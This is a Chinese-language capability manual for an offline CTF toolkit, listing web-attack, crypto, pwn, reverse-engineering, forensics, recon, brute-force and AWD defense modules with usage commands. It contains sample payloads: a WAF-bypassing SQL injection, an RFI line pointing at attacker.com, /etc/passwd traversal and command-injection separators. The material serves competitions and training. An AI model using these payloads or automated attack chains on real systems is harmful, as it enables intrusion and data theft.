# CTF离线版工具包 - 完整能力清单

## 📦 工具包概览

**路径**: `/root/ctf-toolkit/`  
**版本**: v6.1 (2026-06-07更新)  
**文件数**: 48个脚本/模块  
**语言**: Python + Bash  
**GUI**: tkinter图形界面  

---

## 🎯 一、攻击模块 (Web)

### 1. Web快速侦察 (`web/recon.sh`)
```bash
ctf web-recon <URL>
```
**能力**:
- HTTP响应头分析
- robots.txt/sitemap.xml检测
- .git/.env/.DS_Store泄露检测
- 备份文件扫描 (www.zip/backup.zip)
- JS文件分析 (API路由/密钥)
- 子目录扫描 (admin/api/debug)
- 技术栈识别
- CORS配置检测
- 证书信息提取

### 2. SQL注入检测 (`web/sqli.sh`)
```bash
ctf sqli <URL> [param]
```
**能力**:
- 错误型注入检测 (MySQL/PostgreSQL/SQLite/MSSQL)
- 联合查询注入 (-1 UNION SELECT)
- 报错注入 (extractvalue/updatexml)
- 时间盲注 (SLEEP/WAITFOR/pg_sleep)
- 布尔盲注 (AND 1=1/AND 1=2)
- **Coraza WAF绕过** (UNION VALUES) ← NEW
- sqlmap集成
- 自动化数据提取

### 3. 文件上传绕过 (`web/upload.sh`)
```bash
ctf upload <URL> <UPLOAD_PATH>
```
**能力**:
- 后缀绕过 (.php3/.php5/.phtml/.phar/.jspx)
- Content-Type伪造 (image/jpeg)
- 文件头绕过 (GIF89a/\x89PNG)
- 双重后缀 (shell.php.jpg)
- .htaccess/.user.ini配置文件
- 竞争条件上传

### 4. SSTI模板注入 (`web/ssti.sh`)
```bash
ctf ssti <URL> [param]
```
**能力**:
- Jinja2/Twig/Smarty/Blade检测
- {{7*7}}确认
- {{config.SECRET_KEY}}提取
- flask-unsign session伪造
- RCE payload生成

### 5. 文件包含 (`web/lfi.sh`)
```bash
ctf lfi <URL> <PARAM>
```
**能力**:
- 本地文件包含 (../../../../etc/passwd)
- 目录穿越绕过 (....//....//)
- PHP伪协议 (php://filter/convert.base64-encode)
- 远程文件包含 (http://attacker.com/shell.txt)
- 日志投毒 (User-Agent写入PHP代码)

### 6. XSS检测 (`web/xss.sh`)
```bash
ctf xss <URL>
```
**能力**:
- 反射型XSS检测
- DOM型XSS检测
- 存储型XSS检测
- CSP绕过
- XSS payload生成

### 7. JWT攻击 (`web/jwt.sh`)
```bash
ctf jwt <TOKEN>
```
**能力**:
- JWT解码
- alg=none攻击
- 密钥爆破
- RS256→HS256混淆
- kid注入

### 8. 命令注入 (`web/cmdi.sh`)
```bash
ctf cmdi <URL> <PARAM>
```
**能力**:
- 管道符绕过 (|, &, ;, &&, ||)
- 反引号注入 (`` `command` ``)
- $()注入 ($(command))
- 空格绕过 (${IFS})
- 引号绕过

### 9. Webshell生成 (`web/webshell.sh`)
```bash
ctf shell [TYPE]
```
**能力**:
- PHP Webshell (一句话/大马/小马)
- JSP Webshell
- ASP Webshell
- Python Webshell
- 反弹Shell (bash/python/perl/ruby/php)
- 内存马

### 10. 自动化利用 (`web/exploit.sh`)
```bash
ctf exploit <URL>
```
**能力**:
- 漏洞自动检测
- 一键利用
- Flag自动提取

---

## 🔐 二、密码学模块 (`crypto/`)

### 1. 自动解密 (`crypto/crypto_tool.py`)
```bash
ctf crypto <MODE> <INPUT>
```
**支持模式**:
- **编码**: Base64/32/16, URL, Unicode, Hex, Binary
- **古典密码**: Caesar, Vigenère, Rail Fence, Bacon, Morse, Playfair
- **现代密码**: RSA, AES, DES, ChaCha20, XOR
- **哈希**: MD5, SHA1/256/512, NTLM, MySQL
- **自动检测**: 多层编码递归解码

### 2. RSA攻击 (`crypto/rsa_attack.py`)
```bash
ctf rsa <n> <e> <c>
```
**攻击方式**:
- 小指数攻击 (e=3, 开立方根)
- 共模攻击 (同n不同e)
- 因数分解 (factordb.com)
- Wiener攻击 (d过大)
- Hastad广播攻击
- Coppersmith攻击

### 3. 哈希破解 (`crypto/hash_crack.sh`)
```bash
ctf hash <HASH>
```
**能力**:
- 哈希类型自动识别
- 字典爆破
- 彩虹表查询
- john/hashcat集成

### 4. 编码检测 (`crypto/encode_detect.py`)
```bash
ctf encode <TEXT>
```
**能力**:
- 多重编码检测
- 自动递归解码
- 编码类型识别

---

## 💥 三、PWN模块 (`pwn/`)

### 1. 保护检查 (`pwn/checksec.sh`)
```bash
ctf pwn-check <BINARY>
```
**检测项**:
- NX (堆栈不可执行)
- ASLR (地址随机化)
- PIE (位置无关可执行)
- Stack Canary (栈保护)
- RELRO (重定位只读)
- FORTIFY

### 2. Exploit模板 (`pwn/exploit_template.py`)
```bash
ctf pwn-exploit <BINARY>
```
**能力**:
- 自动生成exploit模板
- 基于保护机制选择利用方式
- ret2text/ret2libc/ret2syscall
- shellcode注入

### 3. 模式字符串 (`pwn/pattern.py`)
```bash
ctf pwn-pattern <LEN>
```
**能力**:
- 生成模式字符串
- 计算偏移量
- 精确定位溢出点

### 4. ROP搜索 (`pwn/rop_search.sh`)
```bash
ctf pwn-rop <BINARY>
```
**能力**:
- ROP gadget搜索
- libc地址泄露
- system/execve地址计算

---

## 🔄 四、逆向模块 (`reverse/`)

### 1. 静态分析 (`reverse/static.sh`)
```bash
ctf rev <BINARY>
```
**能力**:
- strings提取
- objdump反汇编
- radare2分析
- Ghidra脚本生成
- 函数识别
- 字符串交叉引用

### 2. 动态分析 (`reverse/dynamic.sh`)
```bash
ctf rev-dynamic <BINARY>
```
**能力**:
- ltrace库函数追踪
- strace系统调用追踪
- gdb+pwndbg调试
- 内存dump
- 断点设置

### 3. Python反编译 (`reverse/pyc_decompile.py`)
```bash
ctf rev-pyc <FILE>
```
**能力**:
- .pyc字节码反编译
- marshal加载
- 常量池提取
- code object分析

---

## 📁 五、Misc模块 (`misc/`)

### 1. 隐写分析 (`misc/stego.sh`)
```bash
ctf stego <FILE>
```
**能力**:
- PNG: exiftool/zsteg/stegoveritas/pngcheck
- JPEG: steghide提取
- GIF: 帧分离
- 音频: 频谱图/SSTV/DTMF
- LSB隐写
- 高度篡改修复
- Trailer数据提取

### 2. 文件取证 (`misc/forensics.sh`)
```bash
ctf forensics <FILE>
```
**能力**:
- 文件类型识别
- 元数据提取
- 嵌入文件分离
- 损坏文件修复
- 内存取证

### 3. 流量分析 (`misc/pcap.sh`)
```bash
ctf pcap <FILE>
```
**能力**:
- HTTP流量提取
- DNS查询分析
- FTP文件提取
- Flag自动搜索
- Wireshark集成

### 4. 文件分析 (`misc/file_analyze.sh`)
```bash
ctf file <FILE>
```
**能力**:
- 深度文件类型分析
- magic number识别
- 文件结构解析

### 5. 压缩包破解 (`misc/zip_crack.sh`)
```bash
ctf zip <FILE>
```
**能力**:
- 伪加密检测/修复
- CRC爆破
- 密码字典爆破
- john/hashcat集成

---

## 🔍 六、侦察模块 (`recon/`)

### 1. 端口扫描 (`recon/network_scan.sh`)
```bash
ctf scan <TARGET>
```
**能力**:
- TCP/UDP端口扫描
- 服务版本识别
- 操作系统指纹
- nmap/masscan集成

### 2. 服务枚举 (`recon/service_enum.sh`)
```bash
ctf enum <TARGET>
```
**能力**:
- SMB枚举
- SNMP枚举
- LDAP枚举
- NFS枚举
- SMTP枚举

### 3. 暴力破解 (`recon/brute.sh`)
```bash
ctf brute <TARGET> <SERVICE>
```
**支持服务**:
- SSH, FTP, MySQL, PostgreSQL
- HTTP Basic/Form认证
- hydra集成

### 4. 目录FUZZ (`recon/fuzz.sh`)
```bash
ctf fuzz <URL>
```
**能力**:
- 目录爆破
- 参数FUZZ
- 子域名枚举
- gobuster/ffuf/dirsearch集成

---

## 🛡️ 七、防御模块 (`defense/`) - AWD攻防赛

### 1. 流量监控 (`defense/monitor.sh`)
```bash
ctf monitor [IFACE]
```
**能力**:
- 实时流量监控
- 异常连接检测
- 攻击流量告警

### 2. 漏洞修补 (`defense/patch.sh`)
```bash
ctf patch <SERVICE>
```
**能力**:
- SSH加固
- MySQL改密
- Redis设密
- Apache/Nginx加固
- PHP危险函数禁用

### 3. Flag保护 (`defense/flag_protect.sh`)
```bash
ctf flag-protect
```
**能力**:
- Flag文件权限设置 (600)
- inotify监控
- mount hidepid=2

### 4. 攻击检测 (`defense/detect.sh`)
```bash
ctf detect [IFACE]
```
**能力**:
- Webshell扫描
- 后门检测
- 异常进程检测
- 日志审计

### 5. AWD自动化 (`defense/awd.py`)
**能力**:
- 自动攻击
- 自动防御
- Flag自动提交
- 漏洞自动修补

---

## 🚀 八、自动化模块 (`scripts/`)

### 1. 全自动攻击链 (`scripts/auto_attack.sh`)
```bash
ctf auto <TARGET>
```
**流程**:
1. 侦察 (端口/服务/技术栈)
2. 漏洞扫描 (Web/服务)
3. 自动利用
4. Flag提取
5. 报告生成

### 2. Flag搜索 (`scripts/flag_hunter.sh`)
```bash
ctf flag-hunt [PATH]
```
**能力**:
- 文件系统搜索
- 数据库查询
- 内存搜索
- 环境变量检查
- 正则匹配 (flag{}/SAS{}/CTF{})

### 3. 批量利用 (`scripts/batch_exploit.sh`)
```bash
ctf batch <TARGETS_FILE>
```
**能力**:
- 多目标并行攻击
- 结果汇总
- 报告生成

---

## 🎮 九、新增模块 (SAS CTF 2026经验)

### 1. WAF绕过模块 (`waf_bypass.py`)
```bash
python3 waf_bypass.py waf_detect <url>
python3 waf_bypass.py union_values <url> <param> [expr]
python3 waf_bypass.py game_api <url>
python3 waf_bypass.py pdf_leak <pdf_path>
```
**能力**:
- Coraza/ModSecurity WAF检测
- **UNION VALUES完全绕过** @detectSQLi
- left/right替代substring绕过
- WAF允许/拦截函数矩阵 (14允许/13拦截)
- PL/pgSQL EXECUTE注入检测
- 游戏API端点发现
- PDF泄露Flag检测

**核心发现**:
```sql
-- ✅ 完全绕过WAF
x' UNION VALUES(current_database())--
x' UNION VALUES(''||ASCII('A'))--  -- 返回65

-- ❌ 被拦截
x' UNION SELECT 'test'--           -- 403
```

### 2. 游戏题自动化 (`game_auto.py`)
```bash
python3 game_auto.py auto <url>
python3 game_auto.py state <url>
python3 game_auto.py move <url> <direction>
python3 game_auto.py kernel <direction>
```
**能力**:
- 游戏API端点自动发现
- 游戏状态获取与解析
- BFS自动寻路算法
- 自动收集星星
- Kernel代码生成器
- Sandbox限制检测

**Kernel生成**:
```python
# 单步移动
def player_kernel(m, a, o):
    o[0] = 1  # 左

# 智能kernel (避开敌人，收集星星)
def player_kernel(m, a, o):
    # 查找玩家位置
    for y in range(9):
        for x in range(9):
            if m[y][x] == 80:
                # 寻找星星并移动
                ...
```

**Sandbox限制**:
- ❌ 禁止: `import`, `__name__`, `lambda`, `while`, `return`, `or`, `and`
- ❌ 禁止: `list()`, `type()`, `print()`, 三元表达式
- ✅ 允许: `for range`, `if`, `len`, 索引访问, `abs`, `%`, `//`

### 3. 主引擎新增插件 (`engine.py`)

**Coraza WAF绕过插件** (`coraza_bypass`):
- 自动检测Coraza WAF
- 测试UNION VALUES绕过
- 提取数据库名等信息

**游戏API插件** (`game_api`):
- 发现游戏API端点
- 检测sandbox绕过
- 记录可直接调用的API

**PDF泄露插件** (`pdf_leak`):
- 扫描PDF文件
- 提取泄露的flag
- 支持多种flag格式 (flag/FLAG/SAS/ctf/CTF/key/secret/token)

---

## 🖥️ 十、图形界面 (`gui/`)

### CTF GUI (`gui/ctf_gui.py`)
```bash
ctf gui
```
**标签页**:
1. **Web** - SQL注入/XSS/SSTI/LFI/上传
2. **Crypto** - 编码/哈希/RSA/AES
3. **PWN** - 保护检查/exploit模板
4. **Reverse** - 静态/动态分析
5. **Misc** - 隐写/取证/流量
6. **Recon** - 端口扫描/枚举
7. **Defense** - 监控/修补/检测
8. **Tools** - 一键攻击/Flag搜索

**特性**:
- 暗色主题
- 统一ttk风格
- 一键执行
- 实时输出
- Payload速查
- Flag记录

---

## 📊 十一、自动化引擎 (`engine.py`)

### 21个漏洞插件

| 插件 | 严重度 | 自动利用 |
|------|--------|---------|
| sqli | CRITICAL | UNION提取(DBMS感知) |
| cmdi | CRITICAL | 命令执行 |
| lfi | HIGH | 读文件 |
| ssti | CRITICAL | RCE+SECRET_KEY |
| xss | MEDIUM | 反射检测 |
| idor | HIGH | 批量枚举 |
| graphql | HIGH | 内省+数据提取 |
| ssrf | HIGH | 云元数据 |
| open_redirect | LOW | Location检测 |
| jwt | HIGH | alg=none检测 |
| download_traversal | HIGH | 文件读取 |
| cors | MEDIUM | ACAC检测 |
| upload | HIGH | shell执行验证 |
| auth_bypass | HIGH | 页面大小检测 |
| info_leak | MEDIUM | 凭证提取 |
| sensitive_file | MEDIUM | 端点记录 |
| deserialization | CRITICAL | PHP/Java/Py/Node |
| nosqli | HIGH | MongoDB $ne/$gt |
| csrf | MEDIUM | 表单token检测 |
| framework_exploit | CRITICAL | Flask/Spring/ThinkPHP |
| host_header | MEDIUM | Host注入检测 |
| **coraza_bypass** | HIGH | **UNION VALUES绕过** ← NEW |
| **game_api** | MEDIUM | **游戏API发现** ← NEW |
| **pdf_leak** | HIGH | **PDF泄露提取** ← NEW |

### 智能爬虫
- 自动从HTML提取链接/表单/参数
- JS路由分析
- API端点发现

### 自动化流程
1. 目标规范化
2. 端点发现 (30+路径)
3. 漏洞检测 (GET+POST)
4. 自动利用
5. Flag提取 (文件/环境变量/内存/数据库)
6. 报告生成

---

## 📦 十二、Payload库 (`payloads/`)

### Webshell
- PHP一句话/大马/小马
- JSP/ASP/Python Webshell
- 内存马

### SQL注入
- MySQL/PostgreSQL/SQLite/MSSQL payload
- WAF绕过payload
- **Coraza绕过payload** ← NEW

### XSS
- 反射/存储/DOM型 payload
- CSP绕过 payload

### SSTI
- Jinja2/Twig/Smarty payload
- RCE payload

### LFI
- 目录穿越 payload
- PHP伪协议 payload

### 反弹Shell
- bash/python/perl/ruby/php

---

## 📚 十三、字典库 (`wordlists/`)

- 用户名字典
- 密码字典
- 常见目录字典
- 子域名字典
- 参数字典

---

## 🗂️ 十四、战利品管理 (`loot/`)

### 自动保存
- 每次扫描自动创建目录
- 保存所有发现
- JSON结构化输出

### 目录结构
```
loot/
├── web/
│   ├── _155004/
│   │   ├── report.txt
│   │   ├── source.html
│   │   ├── headers.txt
│   │   └── comments.txt
│   └── _153823/
├── auto/
│   ├── 20260603_145228_127.0.0.1/
│   │   ├── findings.json
│   │   ├── flags.txt
│   │   ├── creds.txt
│   │   └── plugin_*.txt
│   └── ...
└── defense/
    └── webshells.json
```

---

## 🎯 十五、快速命令参考

### 攻击
```bash
ctf web-recon <URL>        # Web侦察(10项)
ctf sqli <URL> [param]     # SQL注入(4种+sqlmap)
ctf upload <URL> [path]    # 上传绕过(6种技术)
ctf ssti <URL> [param]     # SSTI(5引擎+RCE)
ctf lfi <URL> <param>      # 文件包含(LFI/RFI/伪协议)
ctf shell all              # 生成全类型Webshell/反弹Shell
ctf exploit <URL>          # 自动化漏洞利用
```

### 密码学
```bash
ctf crypto auto <input>    # 自动检测+3层递归解码
ctf rsa small_e 3 <c>      # RSA小指数攻击
ctf hash <HASH>            # 哈希识别+破解
ctf encode <TEXT>          # 多重编码检测
```

### PWN
```bash
ctf pwn-check <BINARY>     # 保护检查+利用建议
ctf pwn-exploit <BINARY>   # 自动生成exploit模板
ctf pwn-pattern <LEN>      # 生成模式字符串
ctf pwn-rop <BINARY>       # ROP gadget搜索
```

### 逆向
```bash
ctf rev <BINARY>           # 静态分析(strings/objdump/r2)
ctf rev-dynamic <BINARY>   # 动态分析(ltrace/strace/gdb)
ctf rev-pyc <FILE>         # Python字节码反编译
```

### Misc
```bash
ctf stego <FILE>           # 隐写分析(10项)
ctf pcap <FILE>            # 流量分析(HTTP/DNS/FTP/Flag搜索)
ctf zip <FILE>             # 压缩包(伪加密/CRC/john)
ctf file <FILE>            # 文件类型深度分析
ctf forensics <FILE>       # 文件取证分析
```

### 侦察
```bash
ctf scan <TARGET>          # 端口扫描+服务识别
ctf enum <TARGET>          # 服务枚举
ctf brute <TARGET> <SVC>   # 暴力破解(ssh/ftp/mysql)
ctf fuzz <URL>             # 目录/参数FUZZ
```

### 防御 (AWD)
```bash
ctf monitor [IFACE]        # 流量监控
ctf patch <SERVICE>        # 漏洞修补
ctf flag-protect           # Flag文件保护
ctf detect [IFACE]         # 攻击检测
```

### 自动化
```bash
ctf auto <TARGET>          # 全自动攻击链
ctf flag-hunt [PATH]       # Flag搜索
ctf batch <TARGETS_FILE>   # 批量利用
ctf loot                   # 查看战利品
ctf gui                    # 启动图形界面
```

### 新增命令 (SAS CTF 2026)
```bash
python3 waf_bypass.py waf_detect <URL>      # WAF检测
python3 waf_bypass.py union_values <URL> <param>  # UNION VALUES绕过
python3 game_auto.py auto <URL>             # 游戏题自动化
python3 game_auto.py kernel <direction>     # 生成kernel
```

---

## 📈 十六、能力统计

| 模块 | 脚本数 | 命令数 | 漏洞类型 |
|------|--------|--------|----------|
| Web | 10 | 11 | SQLi/XSS/SSTI/LFI/CMDi/上传/JWT |
| Crypto | 4 | 4 | RSA/AES/DES/哈希/编码 |
| PWN | 4 | 4 | 栈溢出/堆利用/格式化字符串 |
| Reverse | 3 | 3 | 静态/动态/字节码 |
| Misc | 5 | 5 | 隐写/取证/流量/压缩包 |
| Recon | 4 | 4 | 端口/服务/暴力/FUZZ |
| Defense | 5 | 4 | 监控/修补/保护/检测 |
| Auto | 3 | 3 | 攻击链/Flag搜索/批量 |
| **New** | **2** | **4** | **WAF绕过/游戏题/PDF泄露** |
| **总计** | **48** | **42** | **24+漏洞类型** |

---

## 🎓 十七、使用场景

### 场景1: CTF比赛 (Jeopardy)
```bash
# 1. 快速侦察
ctf web-recon http://target.com

# 2. 自动化扫描
ctf auto http://target.com

# 3. Flag搜索
ctf flag-hunt /tmp
```

### 场景2: AWD攻防赛
```bash
# 1. 赛前加固
ctf flag-protect
ctf patch all

# 2. 攻击阶段
ctf scan 192.168.1.0/24
ctf auto 192.168.1.100

# 3. 持续防御
ctf monitor
ctf detect
```

### 场景3: 隔离网络比赛
```bash
# 使用离线工具包
bash ctf.sh web-recon http://target
bash ctf.sh sqli http://target?id=1
bash ctf.sh crypto base64 SGVsbG8=
```

### 场景4: 游戏题 (Kolobok模式)
```bash
# 自动玩游戏
python3 game_auto.py auto https://game.ctf.com

# 生成kernel
python3 game_auto.py kernel 左
```

### 场景5: WAF绕过 (Coraza)
```bash
# 检测WAF
python3 waf_bypass.py waf_detect https://target.com/api

# 绕过并提取数据
python3 waf_bypass.py union_values https://target.com/api id current_database()
```

---

## 🔧 十八、环境要求

### 必需工具
- Python 3.8+
- Bash 4.0+
- curl/wget
- nmap
- sqlmap
- john/hashcat
- strings/objdump
- steghide/zsteg
- Wireshark/tshark

### 可选工具
- Ghidra/IDA (逆向)
- pwndbg (PWN)
- Burp Suite (Web)
- Metasploit (渗透)

### 安装
```bash
cd /root/ctf-toolkit
chmod +x setup.sh
./setup.sh
```

---

## 📚 十九、文档索引

1. **README.md** - 主文档
2. **USAGE.md** - 详细使用说明 (600+行)
3. **UPDATE_LOG.md** - 更新日志
4. **SAS_CTF_2026_OPTIMIZATION.md** - SAS CTF经验优化
5. **ctf-cheatsheet.md** - 速查手册
6. **ctf-quickref.md** - 快速参考卡

---

## 🏆 二十、总结

### 核心优势
1. **全覆盖**: Web/Crypto/PWN/Reverse/Misc全题型
2. **自动化**: 21个漏洞插件 + 智能爬虫 + 自动利用
3. **离线可用**: 不依赖网络，适合隔离环境
4. **模块化**: 独立脚本，易于扩展
5. **GUI支持**: 图形界面一键操作
6. **AWD支持**: 攻防赛专用模块
7. **实战验证**: SAS CTF 2026经验优化

### 版本历史
- v1.0: 基础脚本集合
- v2.0: 模块化架构
- v3.0: GUI图形界面
- v4.0: 自动化引擎
- v5.0: AWD防御模块
- v6.0: 插件化架构 (21个插件)
- **v6.1**: SAS CTF 2026优化 (WAF绕过/游戏题/PDF泄露)

---

**最后更新**: 2026-06-07  
**维护者**: CTF Automation Team  
**许可证**: MIT
